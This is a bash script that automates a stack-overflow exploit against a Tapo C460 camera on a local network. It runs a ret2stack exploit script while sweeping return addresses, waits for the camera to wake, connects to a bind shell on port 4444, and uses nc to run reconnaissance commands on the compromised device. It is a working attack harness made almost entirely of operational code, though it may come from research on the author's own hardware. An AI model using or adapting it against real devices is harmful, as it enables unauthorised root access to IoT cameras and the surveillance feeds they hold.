#!/bin/bash
cd /Users/jemanuel/projects/franken_surveillance_system
STATE=/tmp/c460_sweep_incremental.idx
[ -s "$STATE" ] && IDX=$(cat "$STATE") || IDX=0
BASE=0xbef80000
STEP=0x400
COUNT=256
LOG=/tmp/c460_incremental_sweep.log
log() { echo "$(date '+%H:%M:%S') $*" >> "$LOG"; }
log "incremental sweep starting from index $IDX"
while [ $IDX -lt $COUNT ]; do
  # DS-gate: only shoot when the camera is FULLY awake (HTTP worker bound)
  DS=$(curl -sk -m 5 --interface en1 -X POST -H "User-Agent: Tapo CameraClient Android" \
    -d '{"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}' \
    https://192.168.4.33/ 2>/dev/null | head -c 40)
  case "$DS" in
    *error_code*) : ;;          # full wake — proceed
    *) log "camera not fully awake (DS silent), waiting"; sleep 45; continue ;;
  esac
  ADDR=$(printf "0x%x" $((BASE + IDX * STEP)))
  # fire the exploit with the current address
  RESULT=$(FORCE=1 timeout 25 sudo -n /opt/homebrew/bin/python3 deliverables/scripts/tapo_connectap_sc.py ret2stack \
    --host 192.168.4.33 --offset 1060 --sled 0 --padpc 1 --sledfill --pcround 0x1000 \
    --addr $ADDR --count 1 --mac 50:3D:D1:E3:E2:07 2>&1 | grep -E "alive|DEAD|SHELL" | tail -1)
  log "$ADDR $RESULT"
  # hang/dead at an address pins this boot's stack region
  if echo "$RESULT" | grep -qE "DEAD|hang"; then
    log "HANG/DEAD at $ADDR — writing found-address and re-firing once for the shell"
    echo "$ADDR" > /tmp/c460_root_addr.txt
  fi
  # check for shell (direct connect, no nc -z — it consumes the one-shot)
  if timeout 4 bash -c 'exec 3<>/dev/tcp/192.168.4.33/4444' 2>/dev/null; then
    log "SHELL FOUND at $ADDR"
    echo "$ADDR" > /tmp/c460_root_addr.txt
    mkdir -p /tmp/pane1/192.168.4.33
    (printf 'id\n'; sleep 2; printf 'cat /proc/mtd\n'; sleep 2; printf 'cat /proc/version\n'; sleep 2) | \
      timeout 12 nc 192.168.4.33 4444 > /tmp/pane1/192.168.4.33/recon_sweep.txt 2>/dev/null
    log "recon bytes: $(wc -c < /tmp/pane1/192.168.4.33/recon_sweep.txt 2>/dev/null)"
    break
  fi
  # persist the index (survives camera sleep)
  echo $IDX > "$STATE"
  IDX=$((IDX + 1))
  sleep 3
done
log "incremental sweep done"
